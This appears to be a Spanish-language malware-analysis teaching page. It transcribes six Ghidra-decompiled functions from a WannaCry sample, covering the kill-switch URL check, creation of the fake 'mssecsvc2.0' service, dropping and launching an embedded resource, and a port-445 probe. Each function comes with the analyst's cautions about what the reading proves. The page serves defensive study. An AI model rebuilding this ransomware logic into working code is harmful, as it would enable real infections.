# P1 — Código seleccionado para lectura

**Alcance inicial:** 6 funciones transcritas de 176 reconocidas por Ghidra.
Consulta [qué falta y cómo ampliar P1](../ALCANCE-Y-AMPLIACION.md#p1);
la selección no equivale al análisis completo del componente.

[Guía de esta persona](README.md) · [Índice del equipo](../README.md)

Componente SHA-256: `24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c`. Arquitectura: **x86, PE32**.

Consulta de origen (UTC): `2026-11-15T17:53:59.916705+00:00`. Ghidra **12.2 DEV**.

Cuerpos transcritos del Decompiler, con normalización de espacios; las explicaciones exteriores son editoriales. No es código fuente original ni preparado para compilar. Los comentarios y nombres españoles dentro del código pertenecen al analista.

El JSON original y las muestras se conservan localmente, fuera de Git. La identidad y los hashes de texto están en [indice.json](../indice.json).

## Navegación

- [00408140 — Decisión según el handle](#f-00408140)
- [00408090 — Distribución de caminos](#f-00408090)
- [00407f20 — Dos llamadas consecutivas](#f-00407f20)
- [00407c40 — Solicitud de servicio](#f-00407c40)
- [00407ce0 — Recurso R/1831 y escritura](#f-00407ce0)
- [00407480 — Constante 445 y llamadas por ordinal](#f-00407480)

<a id="f-00408140"></a>

## 00408140 — Decisión según el handle

Nombre en la exportación: `Comprobar_KillSwitch-00408140`.

**Qué mirar:** Localiza la condición sobre handle y escribe las dos rutas. El bucle anterior copia una cadena; no acredita cifrado. El cierre con handle nulo se conserva tal como aparece.

```c
/* MCP 2026-11-15: compara con NULL el handle de InternetOpenUrlA. La rama NULL llama 00408090. No
   verifica explícitamente HTTP 200. Confirmado con ensamblado; no es observación de una
   ejecución ni evidencia del NHS. */

undefined4 Comprobar_KillSwitch(void)

{
  void *session;
  void *handle;
  int iVar1;
  char *pcVar2;
  char *pcVar3;
  char local_50 [57];
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined4 local_7;
  undefined2 local_3;
  undefined1 local_1;

  pcVar2 = s_http___www_iuqerfsodp9ifjaposdfj_004313d0;
  pcVar3 = local_50;
  for (iVar1 = 0xe; iVar1 != 0; iVar1 = iVar1 + -1) {
    *(undefined4 *)pcVar3 = *(undefined4 *)pcVar2;
    pcVar2 = pcVar2 + 4;
    pcVar3 = pcVar3 + 4;
  }
  *pcVar3 = *pcVar2;
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_3 = 0;
  local_1 = 0;
  session = InternetOpenA((char *)0x0,1,(char *)0x0,(char *)0x0,0);
  handle = InternetOpenUrlA(session,local_50,(char *)0x0,0,0x84000000,0);
  if (handle == (void *)0x0) {
    InternetCloseHandle(session);
    InternetCloseHandle((void *)0x0);
    Preparar_Servicio_Y_Carga();
    return 0;
  }
  InternetCloseHandle(session);
  InternetCloseHandle(handle);
  return 0;
}
```

**Límite de la conclusión:** El resultado de esta lectura no demuestra una conexión real ni una respuesta HTTP concreta.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-00408090"></a>

## 00408090 — Distribución de caminos

Nombre en la exportación: `Preparar_Servicio_Y_Carga-00408090`.

**Qué mirar:** Compara argc < 2 con el camino del dispatcher de servicio. El nombre español fue añadido por el analista.

```c
/* Distribuye las ramas según argumentos. Nombre descriptivo del analista, no símbolo original. */

void Preparar_Servicio_Y_Carga(void)

{
  int *piVar1;
  SC_HANDLE hSCManager;
  SC_HANDLE hSCObject;
  SERVICE_TABLE_ENTRYA SStack_10;
  undefined4 uStack_8;
  undefined4 uStack_4;

  GetModuleFileNameA((HMODULE)0x0,&DAT_0070f760,0x104);
  piVar1 = (int *)__p___argc();
  if (*piVar1 < 2) {
    FUN_00407f20();
    return;
  }
  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (hSCManager != (SC_HANDLE)0x0) {
    hSCObject = OpenServiceA(hSCManager,s_mssecsvc2_0_004312fc,0xf01ff);
    if (hSCObject != (SC_HANDLE)0x0) {
      FUN_00407fa0(hSCObject,0x3c);
      CloseServiceHandle(hSCObject);
    }
    CloseServiceHandle(hSCManager);
  }
  SStack_10.lpServiceName = s_mssecsvc2_0_004312fc;
  SStack_10.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)&LAB_00408000;
  uStack_8 = 0;
  uStack_4 = 0;
  StartServiceCtrlDispatcherA(&SStack_10);
  return;
}
```

**Límite de la conclusión:** No todos los caminos ejecutan las mismas operaciones; no elimines la condición al describir el flujo.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-00407f20"></a>

## 00407f20 — Dos llamadas consecutivas

Nombre en la exportación: `FUN_00407f20-00407f20`.

**Qué mirar:** Relaciona cada llamada con la siguiente sección. No hay un if que controle aquí el resultado de la primera llamada.

```c
undefined4 FUN_00407f20(void)

{
  Crear_Servicio_mssecsvc();
  Extraer_Recurso_R_1831();
  return 0;
}
```

**Límite de la conclusión:** El orden del código no acredita que ambas operaciones hayan tenido éxito.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-00407c40"></a>

## 00407c40 — Solicitud de servicio

Nombre en la exportación: `Crear_Servicio_mssecsvc-00407c40`.

**Qué mirar:** Marca los retornos de OpenSCManagerA y CreateServiceA; después observa qué retorno de StartServiceA se utiliza.

```c
/* CreateServiceA: mssecsvc2.0, argumento -m security, inicio 2. Comportamiento inferido
   estáticamente; no se generó un evento 7045. */

undefined4 Crear_Servicio_mssecsvc(void)

{
  SC_HANDLE hSCManager;
  SC_HANDLE hService;
  char local_104 [260];

  sprintf(local_104,s__s__m_security_00431330,&DAT_0070f760);
  hSCManager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
  if (hSCManager == (SC_HANDLE)0x0) {
    return 0;
  }
  hService = CreateServiceA(hSCManager,s_mssecsvc2_0_004312fc,
                            s_Microsoft_Security_Center__2_0__S_00431308,0xf01ff,0x10,2,1,local_104,
                            (LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,(LPCSTR)0x0);
  if (hService != (SC_HANDLE)0x0) {
    StartServiceA(hService,0,(LPCSTR *)0x0);
    CloseServiceHandle(hService);
  }
  CloseServiceHandle(hSCManager);
  return 0;
}
```

**Límite de la conclusión:** El retorno final de esta función no es un registro de instalación del servicio. No se adquirió un evento 7045.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-00407ce0"></a>

## 00407ce0 — Recurso R/1831 y escritura

Nombre en la exportación: `Extraer_Recurso_R_1831-00407ce0`.

**Qué mirar:** Identifica GetProcAddress y el recurso 0x727. Los argumentos recuperados para sprintf y llamadas indirectas son imperfectos: usa el Listing enlazado en tu guía.

```c
/* FindResourceA ID 0x727, tipo R. El recurso extraído coincide byte a byte por SHA-256 con
   ed01ebfb...; original conservado. */

undefined4 Extraer_Recurso_R_1831(void)

{
  char cVar1;
  HMODULE hModule;
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID pvVar2;
  DWORD DVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  char *pcVar7;
  undefined4 *puVar8;
  char *pcVar9;
  char *pcVar10;
  undefined4 uVar11;
  undefined4 uStack_290;
  char *pcStack_28c;
  undefined4 uStack_288;
  undefined4 uStack_284;
  undefined4 uVar12;
  char acStack_23c [52];
  char local_208;
  undefined4 local_207;
  char local_104;
  undefined4 local_103;

  hModule = GetModuleHandleW(u_kernel32_dll_004313b4);
  if (hModule != (HMODULE)0x0) {
    DAT_00431478 = GetProcAddress(hModule,s_CreateProcessA_004313a4);
    DAT_00431458 = GetProcAddress(hModule,s_CreateFileA_00431398);
    DAT_00431460 = GetProcAddress(hModule,s_WriteFile_0043138c);
    DAT_0043144c = GetProcAddress(hModule,s_CloseHandle_00431380);
    if ((((DAT_00431478 != (FARPROC)0x0) && (DAT_00431458 != (FARPROC)0x0)) &&
        (DAT_00431460 != (FARPROC)0x0)) && (DAT_0043144c != (FARPROC)0x0)) {
      hResInfo = FindResourceA((HMODULE)0x0,(LPCSTR)0x727,&DAT_0043137c);
      if (hResInfo != (HRSRC)0x0) {
        hResData = LoadResource((HMODULE)0x0,hResInfo);
        if (hResData != (HGLOBAL)0x0) {
          pvVar2 = LockResource(hResData);
          if (pvVar2 != (LPVOID)0x0) {
            DVar3 = SizeofResource((HMODULE)0x0,hResInfo);
            if (DVar3 != 0) {
              local_208 = '\0';
              puVar8 = &local_207;
              for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
                *puVar8 = 0;
                puVar8 = puVar8 + 1;
              }
              *(undefined2 *)puVar8 = 0;
              *(undefined1 *)((int)puVar8 + 2) = 0;
              local_104 = '\0';
              puVar8 = &local_103;
              for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {
                *puVar8 = 0;
                puVar8 = puVar8 + 1;
              }
              *(undefined2 *)puVar8 = 0;
              *(undefined1 *)((int)puVar8 + 2) = 0;
              uStack_284 = 0x407e03;
              sprintf(&local_208,s_C___s__s_00431358);
              sprintf(&local_104,s_C___s_qeriuwjhrf_00431344);
              MoveFileExA(&local_208,&local_104,1);
              uVar12 = 2;
              uStack_284 = 0;
              pcStack_28c = &local_208;
              uStack_288 = 0x40000000;
              uStack_290 = 0x407e49;
              iVar4 = (*DAT_00431458)();
              if (iVar4 != -1) {
                uStack_290 = 0;
                (*DAT_00431460)(iVar4,uVar12,DVar3,acStack_23c + -0x40);
                (*DAT_0043144c)(iVar4);
                pcStack_28c = (char *)0x0;
                uStack_288 = 0;
                uStack_284 = 0;
                pcVar7 = acStack_23c + -0x40;
                for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {
                  pcVar7[0] = '\0';
                  pcVar7[1] = '\0';
                  pcVar7[2] = '\0';
                  pcVar7[3] = '\0';
                  pcVar7 = pcVar7 + 4;
                }
                uVar5 = 0xffffffff;
                pcVar7 = (char *)&DAT_00431340;
                do {
                  pcVar10 = pcVar7;
                  if (uVar5 == 0) break;
                  uVar5 = uVar5 - 1;
                  pcVar10 = pcVar7 + 1;
                  cVar1 = *pcVar7;
                  pcVar7 = pcVar10;
                } while (cVar1 != '\0');
                uVar5 = ~uVar5;
                uStack_290 = 0;
                iVar4 = -1;
                pcVar7 = acStack_23c;
                do {
                  pcVar9 = pcVar7;
                  if (iVar4 == 0) break;
                  iVar4 = iVar4 + -1;
                  pcVar9 = pcVar7 + 1;
                  cVar1 = *pcVar7;
                  pcVar7 = pcVar9;
                } while (cVar1 != '\0');
                pcVar7 = pcVar10 + -uVar5;
                pcVar10 = pcVar9 + -1;
                for (uVar6 = uVar5 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {
                  *(undefined4 *)pcVar10 = *(undefined4 *)pcVar7;
                  pcVar7 = pcVar7 + 4;
                  pcVar10 = pcVar10 + 4;
                }
                for (uVar5 = uVar5 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {
                  *pcVar10 = *pcVar7;
                  pcVar7 = pcVar7 + 1;
                  pcVar10 = pcVar10 + 1;
                }
                uVar11 = 0;
                uVar12 = 0;
                iVar4 = (*DAT_00431478)(0,acStack_23c,0,0,0,0x8000000,0,0,acStack_23c + -0x44,
                                        &uStack_290);
                if (iVar4 != 0) {
                  (*DAT_0043144c)(uVar11);
                  (*DAT_0043144c)(uVar12);
                }
              }
            }
          }
        }
      }
    }
  }
  return 0;
}
```

**Límite de la conclusión:** El comentario heredado dice «byte a byte por SHA-256»: son métodos distintos. La relación se sustenta en la extracción/cotejos descritos en la guía; esta transcripción no los vuelve a ejecutar.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).


<a id="f-00407480"></a>

## 00407480 — Constante 445 y llamadas por ordinal

Nombre en la exportación: `Comprobar_Conexion_445-00407480`.

**Qué mirar:** Convierte 0x1bd a decimal. Observa que los nombres Ordinal_* no explican por sí solos los prototipos ni todo el protocolo.

```c
/* Constante 0x1bd y llamadas WS2_32 por ordinal. No se realizó tráfico SMB. */

undefined4 Comprobar_Conexion_445(undefined4 param_1)

{
  int iVar1;
  undefined4 uVar2;
  undefined2 *puStack_13c;
  undefined4 uStack_138;
  undefined4 uStack_134;
  undefined4 uStack_130;
  undefined4 uStack_12c;
  undefined2 local_120;
  undefined2 local_11e;
  undefined2 uStack_11c;
  undefined2 local_11a;
  undefined2 uStack_118;
  undefined4 local_116;
  undefined2 local_112;
  undefined4 local_110;

  local_11e = 0;
  uStack_118 = 0;
  local_116 = 0;
  uStack_12c = 0x1bd;
  local_112 = 0;
  local_110 = 1;
  uStack_11c = (undefined2)param_1;
  local_11a = (undefined2)((uint)param_1 >> 0x10);
  local_120 = 2;
  uStack_130 = 0x4074c0;
  Ordinal_9();
  uStack_130 = 6;
  uStack_134 = 1;
  uStack_138 = 2;
  puStack_13c = (undefined2 *)0x4074cf;
  iVar1 = Ordinal_23();
  if (iVar1 == -1) {
    return 0;
  }
  puStack_13c = &local_120;
  Ordinal_10(iVar1,0x8004667e);
  uStack_11c = (undefined2)iVar1;
  local_11a = (undefined2)((uint)iVar1 >> 0x10);
  local_120 = 1;
  local_11e = 0;
  Ordinal_4(iVar1,&puStack_13c,0x10);
  uVar2 = Ordinal_18(0,0,&uStack_12c,0,&uStack_134);
  Ordinal_3(iVar1);
  return uVar2;
}
```

**Límite de la conclusión:** La función seleccionada no es una demostración completa de EternalBlue; no se realizó tráfico con este material.

En tu ficha: entradas → condición → llamadas → retorno → evidencia faltante. [Volver a la guía](README.md).
